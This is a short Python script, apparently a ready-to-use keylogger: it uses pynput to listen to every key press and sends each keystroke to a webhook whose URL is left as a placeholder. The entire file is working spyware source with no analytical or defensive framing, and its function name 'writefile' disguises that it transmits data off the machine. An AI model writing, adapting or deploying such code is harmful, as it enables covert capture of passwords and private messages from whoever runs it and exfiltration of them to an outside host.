from pynput.keyboard import Listener
from dhooks import Webhook

hook = Webhook("PASTE_WEBHOOK_LINK")

def writefile(key):
    try:
        letter = str(key)
        hook.send(letter)
    except KeyError:
        pass

with Listener(on_press=writefile) as lis:
    lis.join()
